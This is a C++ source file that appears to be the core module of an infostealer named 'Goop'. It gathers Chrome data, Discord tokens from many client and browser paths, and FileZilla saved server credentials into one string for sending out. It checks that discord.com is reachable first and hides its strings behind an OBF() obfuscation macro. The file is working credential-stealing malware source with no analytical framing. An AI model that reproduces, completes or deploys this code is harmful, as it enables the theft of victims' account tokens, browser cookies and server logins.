#include "goop.h"
#include <WinInet.h>

#include "system.h"
#include "chrome.h"
#include "discord.h"
#include "filezilla.h"

Goop::Goop() noexcept
{
	if (!this->ValidateEnvironment())
	{
		return;
	}

	this->LoadPaths();

	System system;

	if (system.GetStatus())
	{
		this->sGoopedData.append(system.GetData());
	}

	Chrome chrome(this->umssPaths[(OBF("chrome_base"))]);
	if (chrome.GetStatus())
	{
		this->sGoopedData.append(OBF("Chrome data:\n") + chrome.GetData());
	}
	
	Discord discord(this->vsDiscordPaths);
	if (discord.GetStatus())
	{
		this->sGoopedData.append(OBF("Discord data:\n") + discord.GetData());
	}
	
	Filezilla filezilla(this->umssPaths[(OBF("filezilla"))]);
	if (filezilla.GetStatus())
	{
		this->sGoopedData.append(OBF("Filezilla data:\n\n") + filezilla.GetData());
	}
}


bool Goop::GetStatus() noexcept
{
	return !(this->sGoopedData.empty());
}

std::string Goop::GetGoopedData() noexcept
{
	return this->sGoopedData;
}

bool Goop::ValidateEnvironment() noexcept
{
	//If we can't communicate the data, it's pointless to goop them.
	if (!InternetCheckConnectionA(OBF("https://discord.com"), FLAG_ICC_FORCE_CONNECTION, 0))
		return false;

	return true;
}

void Goop::LoadPaths() noexcept
{
	std::string roaming		= getenv(OBF("appdata"));
	std::string local		= getenv(OBF("localappdata"));

	//Get common paths
	this->umssPaths = {
		{OBF("roaming"), roaming},
		{OBF("local"), local},
		{OBF("chrome_base"), local + OBF("\\Google\\Chrome\\User Data\\")},
		{OBF("chrome_cookies"), local + OBF("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")},
		{OBF("chrome_history"), local + OBF("\\Google\\Chrome\\User Data\\Default\\History")},
		{OBF("filezilla"), roaming + OBF("\\FileZilla\\sitemanager.xml")}
	};

	//Get common discord token paths
	this->vsDiscordPaths = {
		roaming + OBF("\\discord\\"),
		roaming + OBF("\\discordcanary\\"),
		roaming + OBF("\\Lightcord\\"),
		local + OBF("\\Google\\Chrome\\User Data\\Default\\"),
		local + OBF("\\Google\\Chrome\\User Data\\Profile 1\\"),
		local + OBF("\\Google\\Chrome\\User Data\\Profile 2\\"),
		local + OBF("\\Google\\Chrome\\User Data\\Profile 3\\"),
		local + OBF("\\Google\\Chrome\\User Data\\Profile 4\\"),
		local + OBF("\\Google\\Chrome\\User Data\\Profile 1\\"),
		local + OBF("\\Microsoft\\Edge\\User Data\\Defaul\\"),
		roaming + OBF("\\Opera Software\\Opera Stable\\"),
		roaming + OBF("\\Opera Software\\Opera GX Stable\\"),
		local + OBF("\\BraveSoftware\\Brave - Browser\\User Data\\Default\\")
	};
}